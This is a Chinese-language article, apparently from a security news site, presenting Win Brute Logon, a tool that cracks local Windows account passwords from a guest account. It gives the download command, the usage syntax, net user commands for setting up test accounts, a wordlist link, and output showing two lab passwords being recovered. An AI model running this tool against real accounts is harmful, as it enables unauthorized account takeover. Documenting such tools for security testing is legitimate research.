## 关于Win Brute Logon

Win Brute
Logon是一款功能强大的Windows用户账号安全测试工具，在该工具的帮助下，广大研究人员可以直接测试任意Windows用户账号的安全，包括来宾账号在内，而且不需要任何特殊权限。

## 工作原理

该工具主要针对的是微软Windows身份验证机制中的一个安全问题，该问题的关键点就在于缺乏执行此类操作所需的特权。在这种情况下，任何用户都可以通过来宾帐户（Microsoft
Windows上最有限的帐户）破解任何本地用户的密码。

最新版本的Win Brute Logon支持Stdin字典，并进行了少量代码优化。工具使用了多线程机制，并且支持32位和64位。

## 工具下载

广大研究人员可以直接使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/DarkCoderSc/win-brute-logon.git

下载下来之后，我们就可以从源码目录中找到对应Windows版本（32位或64位）的WinBruteLogon.exe程序了。

## 工具使用

### 字典文件

    
    
    WinBruteLogon.exe -u <username> -w <wordlist_file>

### Stdin字典

    
    
    type <wordlist_file> | WinBruteLogon.exe -u <username> -
## 工具运行

### 创建一个新的管理员用户

net user darkcodersc /add

net user darkcodersc trousers (密码为trousers)

net localgroup administrators darkcodersc /add

### 创建一个普通用户

net user HackMe /add

net user HackMe ozlq6qwm (密码为ozlq6qwm)

### 创建一个新的来宾账号

net user GuestUser /add

net localgroup users GuestUser /delete

net localgroup guests GuestUser /add

### 生成一个字典

**字典文件：【**[点我获取](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt) **】**

## 执行测试

首先，从管理员帐户注销或重新启动计算机并登录到来宾帐户。然后，将Win Brute Logon可执行程序复制到来宾账户可以访问的任何位置。并运行下列命令：

    
    
    WinBruteLogon.exe -v -u <username> -w <wordlist_file>

### 测试第一个用户：darkcodersc（管理员）

    
    
    WinBruteLogon.exe -v -u darkcodersc -w 10k-most-common.txt

 **测试结果如下：**

    
    
    [ .. ] Load 10k-most-common.txt file in memory...
    
    [DONE] 10002 passwords successfully loaded.
    
    [INFO] 2 cores are available
    
    [ .. ] Create 2 threads...
    
    [INFO] New "TWorker" Thread created with id=2260, handle=364
    
    [INFO] New "TWorker" Thread created with id=3712, handle=532
    
    [DONE] Done.
    
    [ OK ] Password for username=[darkcodersc] and domain=[DESKTOP-0885FP1] found = [trousers]
    
    [ .. ] Finalize and close worker threads...
    
    [INFO] "TWorkers"(id=2260, handle=364) Thread successfully terminated.
    
    [INFO] "TWorkers"(id=3712, handle=532) Thread successfully terminated.
    
    [DONE] Done.
    
    [INFO] Ellapsed Time : 00:00:06

### 测试第二个用户：HackMe（普通用户）

    
    
    WinBruteLogon.exe -v -u HackMe -w 10k-most-common.txt

 **测试结果如下：**

    
    
    [ .. ] Load 10k-most-common.txt file in memory...
    
    [DONE] 10002 passwords successfully loaded.
    
    [INFO] 2 cores are available
    
    [ .. ] Create 2 threads...
    
    [INFO] New "TWorker" Thread created with id=5748, handle=336
    
    [INFO] New "TWorker" Thread created with id=4948, handle=140
    
    [DONE] Done.
    
    [ OK ] Password for username=[HackMe] and domain=[DESKTOP-0885FP1] found = [ozlq6qwm]
    
    [ .. ] Finalize and close worker threads...
    
    [INFO] "TWorkers"(id=5748, handle=336) Thread successfully terminated.
    
    [INFO] "TWorkers"(id=4948, handle=140) Thread successfully terminated.
    
    [DONE] Done.
    
    [INFO] Ellapsed Time : 00:00:06

## 工具运行测试PoC

### 测试目标：Windwos XP到最新版本的Windows 10（1909）

![](https://image.3001.net/images/20220314/1647189749_622e1ef53d1d4e6f09612.png!small)

 **漏洞位置：** LogonUserA, LogonUserW, CreateProcessWithLogonA,
CreateProcessWithLogonW

## 项目地址

 **Win Brute Logon：** 【[ _GitHub传送门_](https://github.com/DarkCoderSc/win-brute-logon)】

## 参考资料

> [ _https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-> Credentials/10k-most-> common.txt﻿_](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-> Credentials/10k-most-common.txt)

